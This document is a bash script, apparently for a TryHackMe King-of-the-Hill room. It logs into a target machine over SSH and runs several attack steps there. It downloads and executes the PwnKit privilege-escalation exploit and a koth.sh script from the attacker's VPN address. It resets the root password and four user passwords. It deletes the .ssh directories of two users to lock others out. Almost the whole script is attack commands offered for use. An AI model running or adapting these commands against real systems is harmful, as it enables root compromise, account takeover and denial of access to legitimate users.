#!/bin/bash

read -p "Your TryHackMe username: " nick
read -p "Enter the machine IP address: " ip_address
read -s -p "Enter the new password: " password

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no fortuna@"$ip_address" << EOF

    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
    echo "root:$password" | chpasswd
    echo "fortuna:$password" | chpasswd
    echo "hermes:$password" | chpasswd
    echo "kairos:$password" | chpasswd
    echo "tyche:$password" | chpasswd
rm -rf /home/hermes/.ssh
rm -rf /home/kairos/.ssh

EOF

